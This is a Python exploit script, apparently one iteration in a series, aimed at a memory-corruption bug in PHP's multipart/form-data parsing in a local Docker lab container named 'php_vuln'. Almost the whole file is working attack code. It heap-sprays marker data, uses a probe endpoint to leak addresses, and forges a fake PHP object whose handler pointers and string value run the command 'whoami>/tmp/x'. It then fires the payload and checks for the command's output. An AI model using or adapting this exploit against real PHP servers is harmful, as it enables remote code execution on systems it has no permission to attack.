#!/usr/bin/env python3
"""oom112: BOUNDARY FIX — fat bodies finally parsed.

Root cause of all fat silences tonight: my post() declared
boundary=X while payload68 parts use --BOUND -> PHP parsed ZERO
parts -> no OOM -> no teardown walk. The 98e/g crashes used
payload68's own post (boundary=BOUND).

oom112: warm -> fat-marker (BOUND) -> probe copy spacing -> OBJ
(3-bit law on a tile-instance block address) -> fat-aim
(target_obj=OBJ names-pattern + value block) -> fire (BOUND).

Tile: EVERY 8B slot = OBJ pointer (covers any walked parity);
block at BOFF; block fields reference OBJ absolutely.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
TILE = 1537
MARKER = b"QMARK7XY" * 3
WARM = b"WARMUPX" * 24 + b"W" * 400


def get(url, timeout=60):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(65536).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def post_bound(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_sapi.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(400).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(400).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def post_x(body, timeout=120):
    req = urllib.request.Request(HOST + "/oom_sapi.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=X"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(400).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(400).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=90).stdout


def parse_probe(out):
    rva, offs = None, []
    for line in out.splitlines():
        m = re.search(r"R=([0-9a-f]+) d=((?:[0-9a-f]+ ?)*)", line)
        if m:
            rva = int(m.group(1), 16)
            offs = [int(x, 16) for x in m.group(2).split() if x]
    return rva, offs


def probe_scan(needle, chunk=262144, maxc=6):
    for attempt in range(6):
        code, out = get("%s/oom_probe.php?h=%s&chunk=%d&maxc=%d"
                        % (HOST, needle.hex(), chunk, maxc))
        if code == 200 and out.strip() and "Fatal" not in out \
                and out.strip() not in ("bad", "ERR open"):
            rva, offs = parse_probe(out)
            if rva and offs:
                return offs
        time.sleep(0.7)
    return []


def probe_read(va, n):
    code, out = get("%s/oom_probe.php?read=%d&n=%d" % (HOST, va, n))
    if code != 200 or out.startswith("ERR") or not out.strip():
        return None
    try:
        return bytes.fromhex(out.strip())
    except Exception:
        return None


def obj_block(OBJ):
    B = bytearray(176)
    struct.pack_into("<I", B, 0x00, 1)            # rc
    struct.pack_into("<I", B, 0x04, 0x108)        # ti
    struct.pack_into("<I", B, 0x08, 1)            # handle
    struct.pack_into("<I", B, 0x0C, 1)            # num_args (frame+0x2C)
    struct.pack_into("<Q", B, 0x10, 0)            # ce
    struct.pack_into("<Q", B, 0x38, OBJ & ~0xFF)  # handlers -> table
    struct.pack_into("<Q", B, 0x40, OBJ & ~0xFF)
    struct.pack_into("<Q", B, 0x50, OBJ)          # arg zval value (self)
    struct.pack_into("<I", B, 0x58, 6)            # IS_STRING
    struct.pack_into("<I", B, 0x5C, 0x106)
    struct.pack_into("<Q", B, 0x60, 0)            # h
    struct.pack_into("<I", B, 0x68, 13)           # len("whoami>/tmp/x")
    B[0x6C:0x6C + 13] = b"whoami>/tmp/x"
    B[0x79] = 0
    struct.pack_into("<Q", B, 0x90, 1)            # table[13]=1
    return bytes(B)


print("=== oom112: boundary-fixed fat walk ===", flush=True)
for i in range(20):
    post_x(WARM)

# 1. fat-marker post (BOUND!) — values carry MARKER
mbody = P.build_attack(3400, 0x41414141, value_tile=MARKER + b"M" * 1513)
code, resp = post_bound(mbody)
print("fat-m: (%s) %r" % (code, resp[:60]), flush=True)

# 2. probe marker copies -> per-copy addresses + stride
offs = probe_scan(MARKER)
print("marker copies:", [hex(o) for o in offs][:6], flush=True)
assert len(offs) >= 2
stride = offs[1] - offs[0]
b0v = offs[0]
print("b0v=0x%x stride=%d" % (b0v, stride), flush=True)

# 3. pick copy i + BOFF so block VA passes 3-bit law
OBJ = None
for i in range(0, min(24, len(offs))):
    for BOFF in range(200, TILE - 176):
        cand = offs[i] + BOFF
        if (cand & 0xF) == 8 and ((cand >> 8) & 1) == 1 and ((cand >> 9) & 1) == 0:
            OBJ = cand
            BOFF_USE = BOFF
            break
    if OBJ:
        break
print("OBJ=0x%x copy=%d BOFF=%d" % (OBJ, i, BOFF_USE), flush=True)

# 4. tile: every-8 OBJ pointers + block at BOFF_USE
T = bytearray(TILE)
for off in range(0, BOFF_USE, 8):
    struct.pack_into("<Q", T, off, OBJ)
for off in range(BOFF_USE + 176, TILE - 8, 8):
    struct.pack_into("<Q", T, off, OBJ)
T[BOFF_USE:BOFF_USE + 176] = obj_block(OBJ)

# 5. fat-aim: names pattern -> OBJ (proven walk geometry); values -> tile
abody = P.build_attack(3400, 0x41414141, target_obj=OBJ, value_tile=bytes(T))
code, resp = post_bound(abody)
print("fat-aim: (%s) %r" % (code, resp[:60]), flush=True)

# 6. verify block live at OBJ
d = probe_read(OBJ, 8)
if d:
    rc, ti = struct.unpack("<II", d)
    print("readback @OBJ: rc=%d ti=0x%x %s" % (rc, ti, "OK" if (rc, ti) == (1, 0x108) else "MISMATCH"), flush=True)
else:
    print("readback: unreadable", flush=True)

# 7. fire once more (survivor doctrine) then verdict
code, resp = post_bound(abody)
print("fire2: (%s) %r" % (code, resp[:60]), flush=True)
x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1; ls -la /tmp/core 2>&1'")
print("x:", x.strip(), flush=True)
